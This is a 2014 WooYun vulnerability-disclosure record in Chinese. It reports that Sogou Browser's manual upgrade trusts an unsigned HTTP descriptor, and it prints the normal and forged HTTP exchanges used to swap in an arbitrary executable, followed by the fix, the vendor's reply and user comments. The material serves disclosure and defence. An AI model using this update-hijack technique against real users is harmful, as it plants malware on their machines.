{"id": 45674, "wybug_id": "wooyun-2014-087373", "wybug_title": "搜狗浏览器最新版本升级存在缺陷(可被中间人攻击利用植入木马)", "wybug_corp": "搜狗", "wybug_author": "内谁", "wybug_date": "2014-12-16 15:15", "wybug_open_date": "2015-03-16 15:16", "wybug_type": "非授权访问/认证绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["搜狗浏览器", "木马", "中间人攻击"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-12-16：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-12-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-12-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-02-12：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-02-22：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-03-04：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-03-16：\t细节向公众公开  简要描述： 搜狗浏览器最新版本，升级过程可被中间人攻击利用，可使得获得更新程序的机器被植入任意EXE文件。 详细说明：  搜狗浏览器，手动点击帮助菜单内的在线升级时，会访问一个URL：http://p3p.sogou.com/upgrademanual.php?h=XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX&v=5.1.7.15323&r=0000返回值是一个升级程序的描述文件，没有的话返回ASCII：0攻击者如果伪造这个描述文件，并实现中间人攻击，就可以欺骗目标主机，替换描述文件接下来，搜狗浏览器会自动根据描述文件，下载并校验MD5值和大小，如果合法，直接运行幸运的是，该漏洞只存在于手动升级，自动升级描述文件格式不同，暂不受影响   漏洞证明：  正常的请求及回应：\nGET /upgrademanual.php?h=7BBA50C84B9DF6239B9102C5109CA722&v=5.1.7.15323&r=0000 HTTP/1.1Host: p3p.sogou.comConnection: Keep-AliveUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Accept-Encoding: gzip, deflateCookie: lstCday=16; columnnum=2; SUV=008976A67CCD0982548FCE4D8773C573; m=7BBA50C84B9DF6239B9102C5109CA722; IPLOC=CN1100HTTP/1.1 200 OKServer: nginxDate: Tue, 16 Dec 2014 06:55:09 GMTContent-Type: text/htmlTransfer-Encoding: chunkedConnection: keep-aliveX-Powered-By: PHP/5.1.60\n实现中间人攻击后的请求及回应：\nGET /upgrademanual.php?h=7BBA50C84B9DF6239B9102C5109CA722&v=5.1.7.15323&r=0000 HTTP/1.1Host: p3p.sogou.comConnection: Keep-AliveUser-Agent: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36 SE 2.X MetaSr 1.0Accept-Encoding: gzip, deflateCookie: lstCday=16; columnnum=2; SUV=008976A67CCD0982548FCE4D8773C573; m=7BBA50C84B9DF6239B9102C5109CA722; IPLOC=CN1100HTTP/1.1 200 OKServer: nginx/0.7.64Content-Length: 145Content-Type: text/htmlAccept-Ranges: noneConnection: close98[Upgrade]url=http://download.ie.sogou.com/se/sogou_explorer_10.exemd5=A6CA386D165B288635BD2FB0BF548D19size=368640version=10.1.6.142460\n伪造的升级描述文件截图：\n\n升级成功后自动运行文件截图：\n\n   修复方案：  加密升级描述文件，校验升级文件数字签名   版权声明：转载请注明来源 内谁@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：5  确认时间：2014-12-19 11:43 厂商回复： 感谢支持 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-12-16 16:15 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  连载吧...    \n     2014-12-16 17:13 |    \t\t路西法 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 堕落天使路西法)\t\t \n  估计是没有对下载回来的安装包进行任何验证，国内好多软件也是这样.....    \n     2014-12-16 17:14 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @毕月乌 这个思路我记得wooyun club 线下沙龙时你分享过    \n     2014-12-16 17:19 |    \t\tzph \t\t\t( 普通白帽子  |\t\t\t        Rank:235 漏洞数:43        )\t\t \n  @浩天 ~~~    \n     2014-12-16 18:10 |    \t\t黑吃黑 \t\t\t( 普通白帽子  |\t\t\t        Rank:139 漏洞数:29        | 倚楼听风雨，淡看江湖路...)\t\t \n  中间人很火啊    \n     2014-12-16 22:53 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  @浩天 我映像里也是~大多数软件都存在问题，只是当时时间太紧我没来得及做那么多测试~    \n     2014-12-17 20:50 |    \t\t内谁 \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:5        | 我是内谁)\t\t \n  @毕月乌 确实很多软件都存在问题的，不过弄这些洞也没那么简单，所以发出请厂商注意下，以后都注意点，而且我手里这些都是老的了，还有一大批呢    \n     2014-12-17 20:51 |    \t\t内谁 \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:5        | 我是内谁)\t\t \n  @路西法 不光国内，国外也一样    \n     2014-12-18 21:33 |    \t\t路西法 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:2        | 堕落天使路西法)\t\t \n  @内谁 个人感觉这种洞对个人用户影响甚小（机子没木马病毒之类的），对于企业，政府可能有点威胁。谁这么有空一直监测你的网络流量。    \n     2014-12-19 09:27 |    \t\t内谁 \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:5        | 我是内谁)\t\t \n  @路西法 你错了，对个人影响其实是最大的，你真的以为没有监控你的网络？呵呵    \n     2015-03-16 19:54 |    \t\tsaviour \t\t\t( 普通白帽子  |\t\t\t        Rank:188 漏洞数:29        | Saviour.Com.Cn 网站正在备案中)\t\t \n  这也能给钱，妈的我一找一堆    \n     2015-03-17 00:47 |    \t\tZtz \t\t\t( 普通白帽子  |\t\t\t        Rank:152 漏洞数:40        | 自由职业)\t\t \n  是时候刷一波rank了    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 5, "Ranks": null}